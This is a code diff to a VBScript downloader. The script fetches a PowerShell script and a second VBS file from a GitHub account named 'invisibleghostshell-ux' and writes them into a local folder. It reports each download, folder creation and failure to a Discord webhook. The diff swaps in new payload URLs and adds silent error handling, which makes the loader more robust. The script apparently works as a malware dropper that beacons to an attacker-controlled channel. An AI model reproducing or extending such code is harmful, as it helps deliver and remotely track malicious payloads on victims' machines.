@@ -6,8 +6,8 @@ Dim strRootPath, strPs1Path, strWinPath
 Dim intWait
 Dim strWebhookURL, strOutput
 
-strWinURL = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/win.vbs"
-strPs1URL = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/setup-lua.ps1"
+strWinURL = "https://github.com/invisibleghostshell-ux/last/raw/main/win.vbs"
+strPs1URL = "https://github.com/invisibleghostshell-ux/last/raw/main/setup-lua.ps1"
 
 ' Create WScript.Shell object to get the environment variable
 Set objShell = CreateObject("WScript.Shell")
@@ -25,43 +25,57 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Function to send output to Discord using WinHTTP
 Function SendToDiscord(message)
+    On Error Resume Next
     Dim objWinHTTP, strRequestBody
     Set objWinHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
     strRequestBody = "{""content"":""" & message & """}"
     objWinHTTP.Open "POST", strWebhookURL, False
     objWinHTTP.SetRequestHeader "Content-Type", "application/json"
     objWinHTTP.Send strRequestBody
+    If Err.Number <> 0 Then
+        WScript.Echo "Failed to send message to Discord: " & message
+    End If
+    On Error GoTo 0
 End Function
 
 ' Function to download files
 Function DownloadFile(url, localFile)
+    On Error Resume Next
     Dim objXMLHTTP, objADOStream
     Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     Set objADOStream = CreateObject("ADODB.Stream")
     
-    objXMLHTTP.open "GET", url, False
-    objXMLHTTP.send
+    objXMLHTTP.Open "GET", url, False
+    objXMLHTTP.Send
     
-    objADOStream.Type = 1 ' adTypeBinary
-    objADOStream.Open
-    objADOStream.Write objXMLHTTP.responseBody
-    objADOStream.SaveToFile localFile, 2 ' adSaveCreateOverWrite
-    objADOStream.Close
-    
-    SendToDiscord "Downloaded: " & url
+    If objXMLHTTP.Status = 200 Then
+        objADOStream.Type = 1 ' adTypeBinary
+        objADOStream.Open
+        objADOStream.Write objXMLHTTP.ResponseBody
+        objADOStream.SaveToFile localFile, 2 ' adSaveCreateOverWrite
+        objADOStream.Close
+        SendToDiscord "Downloaded: " & url
+    Else
+        SendToDiscord "Failed to download: " & url & " with status " & objXMLHTTP.Status
+    End If
+    On Error GoTo 0
 End Function
 
 ' Create root folder
 If Not objFSO.FolderExists(strRootPath) Then
     objFSO.CreateFolder(strRootPath)
-    SendToDiscord "Created root folder: " & strRootPath
+    If objFSO.FolderExists(strRootPath) Then
+        SendToDiscord "Created root folder: " & strRootPath
+    Else
+        SendToDiscord "Failed to create root folder: " & strRootPath
+    End If
 End If
 
 ' Download PowerShell script if it does not exist
 SendToDiscord "Starting download of PowerShell script..."
 If Not objFSO.FileExists(strPs1Path) Then DownloadFile strPs1URL, strPs1Path
 
-' Download vbs script if it does not exist
+' Download VBS script if it does not exist
 SendToDiscord "Starting download of VBS script..."
 If Not objFSO.FileExists(strWinPath) Then DownloadFile strWinURL, strWinPath
 
